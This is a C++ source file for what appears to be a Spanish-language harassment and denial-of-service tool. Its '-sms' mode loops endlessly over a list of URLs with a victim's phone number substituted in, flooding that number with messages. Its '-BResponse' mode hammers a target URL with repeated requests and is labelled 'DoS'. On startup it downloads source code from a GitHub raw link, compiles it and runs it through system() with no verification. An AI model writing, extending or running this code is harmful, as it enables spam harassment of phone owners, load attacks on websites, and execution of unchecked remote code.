#include <iostream>
#include <curl/curl.h>
#include <string>
#include <sstream>
#include <fstream>
#include <unistd.h>
#define Black "\e[30m"
#define Red "\e[31m"
#define Green2 "\e[32m"
#define Yellow "\e[33m"
#define Blue "\e[34m"
#define Magenta "\e[35m"
#define Cyan "\e[36m"
#define White "\e[37m"

// colores para el fondo de la consola
#define BG_Black "\e[40m"
#define BG_Green "\e[42m"
#define BG_Yellow "\e[43m"
#define BG_Blue "\e[44m"
#define BG_Magenta "\e[45m"
#define BG_Cyan "\e[46m"
#define BG_White "\e[47m"

// formatos de letra
#define F_italics "\e[3m"
#define F_transparent "\e[8m"
#define F_Normal "\e[0m"
#define F_Bold "\e[1m"
#define F_Strikethrough "\e[9m"
#define F_BlinkingText "\e[5m"
using namespace std;

struct key{
    string version = "3";
}key;


class ognix{
private:
    static size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp){
        ((std::string*)userp)->append((char*)contents, size * nmemb);
        return size * nmemb;
    }
    int key = 0;
public:
    int infget(){
        int v2 = key;
        key = 0;
        return v2;
    }

    string get(const char* url){
        try{
            CURL *curl;
            CURLcode res;
            string bf;

            curl =curl_easy_init();
            if(curl){
                curl_easy_setopt(curl, CURLOPT_URL, url);
                curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
                curl_easy_setopt(curl, CURLOPT_WRITEDATA, &bf);
                res = curl_easy_perform(curl);
                if(res != CURLE_OK){
                    key = 0;
                    curl_easy_cleanup(curl);
                    return "";
                }
                curl_easy_cleanup(curl);
                key = 1;
                return bf;
            }
        }catch(const std::exception& e){
            key = 0;
            return "";
        }

        key = 0;
        return "";
    }
}Internet;

string getl(string text, int line){
    stringstream file(text);
    int num = 0;
    string lin = "";
    while(getline(file, lin)){
        if(line == num){
            return lin;
        }else if(line < num){
            return "";
        }
        num += 1;
    }
    return "";
}

bool isnumber(string e){
        int num  = 0;
        while(true){
            if(e.length() < num || e.length() == num){return true;}
                if(e[num] == '0' || e[num] == '1' || e[num] == '2' || e[num] == '3' || e[num] == '4' || e[num] == '5' || e[num] == '6' || e[num] == '7' || e[num] == '8' || e[num] == '9'){

                }else if(e[num] == ' '){

                }else{
                    return false;
                }

            num += 1;
        }

        return false;
    }
    int toNum(string e){
        stringstream g(e);
        int x = 0;
        g >> x;
        return x;
    }

struct pgweb{
    string websms = R"(

    )";
}dat;


int hack(int cc, char* arm[]){
    string Fr3 = "\e[36m           _____    \n\e[36m          / ___ \\\n\e[36m         / /__/ | ____               \e[33mHerramientas\n\e[36m        / __  _/'/    \\+ +       [\e[33m-sms '%numero%' '%archivo%'\e[36m]:\e[37m spam sms\n\e[36m       / /  \\ \\ | |||. |+  +     [\e[33m-BResponse '%url%'\e[36m]:\e[37m consegir respuestas de una pagina web 'DoS' level 1\n\e[36m   + +/_/ + /_/+'\\____/' + +     [\e[33m-xerxer '%url%' '%puerto%'\e[36m]:\e[37m consegir respuestas de una pagina web 'DoS' level 1\n\e[36m    + +++  +   ++  +  + ++  + v1\n\e[36m   git hub: https://github.com/bite-rrjo\e[0m\n\n";
    cout << F_Bold << Fr3;
    cc -= 1;
    string ff;
    if(cc == 2){
         ff = arm[1];
        if(ff == "-BResponse"){
            ff = arm[2];
                while(true){
                    sleep(1);
                    string res = Internet.get(ff.c_str());
                    if(Internet.infget() == 1){
                        cout << F_Bold << Yellow << "  get! " << Blue << "true" << Yellow << ". " << ff << "\n";
                    }else{
                        cout << F_Bold << Yellow << "  get! " << Red << "false" << Yellow << ". " << ff << "\n";
                    }
                }
        }else{
            cout << Red << F_Bold << " no exite ninguna opcion '" << Yellow << ff << Red << ".\n" << F_Normal;
            return 1;
        }
    }else if(cc == 3){
        ff = arm[1];
        if(ff == "-sms"){
            ff = arm[3];
            string c = arm[2];
            if(isnumber(c) == true){
                fstream file;
                file.open(ff);
                if(file.good() == true){
                    string e;
                    int num = 0;
                    string ne;
                    while(getline(file, e)){
                        while(true){
                            if(e.length() == num || e.length() < num){
                                break;
                            }
                            if(e[num] == '%' && e[num+1] == 'p' && e[num+2] == 'h' && e[num+3] == 'o' && e[num+4] == 'n' && e[num+5] == 'e' && e[num+6] == '%' ){
                                e.replace(num,6,c);
                                break;
                            }
                            num += 1;
                        }
                        ne += e;
                        ne += "\n";
                    }
                    file.close();
                    stringstream fl(ne);
                    while (true){
                        sleep(1);
                        while (getline(fl, e)){
                            sleep(1);
                            string res = Internet.get(e.c_str());
                            if(Internet.infget() == 1){
                                cout << F_Bold << Yellow << "  send! " << Blue << "true" << Yellow << ". " << ff << "\n";
                            }else{
                                cout << F_Bold << Yellow << "  send! " << Red << "false" << Yellow << ". " << ff << "\n";
                            }
                        }
                    }
                    return 0;

                }else{
                    cout << Red << F_Bold << " no exite ningun archivo llamado '" << Yellow << ff << Red << ".\n" << F_Normal;
                    return 0;
                }
            }else{
                cout << Red << F_Bold << " '" << Yellow << c << Red << "' no es un numero.\n" << F_Normal;
                return 0;
            }
        }else{
            cout << Red << F_Bold << " no exite ninguna opcion '" << Yellow << ff << Red << ".\n" << F_Normal;
            return 1;
        }
    }

    cout << F_Bold << Red << "\n error.\n" << F_Normal;
    return 0;
}


int main(int argc, char* argv[]){
    const char* linkv1 = "https://raw.githubusercontent.com/bite-rrjo/DoS-prueba/main/actualizacion";
    const char* urlGit = "https://raw.githubusercontent.com/bite-rrjo/DoS-prueba/main/Dos.cpp";
    string filename = "98381289738127367239f.cpp";
    string namecom = "D320125324242342364";

    string larm = argv[0];
    if(larm == "./rrjo" || larm == "rrjo"){
        string res = Internet.get(linkv1);
        if(Internet.infget() == 1){
            res= getl(res,0);
            if(res == key.version){

            }else{
                cout << Red << F_Bold << " No elimine archivos ni cierre la aplicacion.\n";
                res = Internet.get(urlGit);
                if(Internet.infget() == 1){ 
                    ofstream file(filename);
                    file << res;
                    file.close();
                    string cmd;
                    cmd += "g++ " + filename + " -o " + namecom + " -lcurl";
                    system(cmd.c_str());
                    remove(filename.c_str());
                    cmd = "";
                    cmd += "./" + namecom;
                    system(cmd.c_str());
                    return 0;
                }else{
                    cout << Cyan " No se pudo actualizar el programa.\n" F_Normal;
                    return 0;
                }
            }
        }
        hack(argc, argv);
    }else if(larm == "D320125324242342364" || larm == "./D320125324242342364"){
        rename(larm.c_str(), "rrjo");
        cout << White << "actualizacion completa :)\n" << F_Normal;
        return 0;
    }else{
        rename(larm.c_str(), "rrjo");
    }
    return 0;
}
